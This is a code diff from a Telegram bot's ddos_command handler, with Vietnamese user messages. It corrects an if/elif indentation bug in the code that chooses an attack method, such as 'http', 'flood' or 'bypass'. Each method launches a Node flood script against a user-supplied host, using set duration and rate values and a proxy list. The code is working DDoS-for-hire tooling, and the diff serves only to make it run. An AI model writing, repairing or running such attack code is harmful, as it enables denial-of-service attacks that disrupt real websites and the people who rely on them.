@@ -219,8 +219,8 @@ def ddos_command(message):
         remaining_time = int(10 - (current_time - cooldown_dict[username].get('attack', 0)))
         bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh")
         return
-    if method == "http":
-    command = ["node", "flood.js", host, "120", "32", "20000", "proxy.txt"]
+    elif method == "http":
+        command = ["node", "flood.js", host, "120", "32", "20000", "proxy.txt"]
     elif method == "flood":
         command = ["node", "floodvietnam.js", host, "120", "20000", "20000", "proxy.txt", "flood"]
     elif method == "bypass":
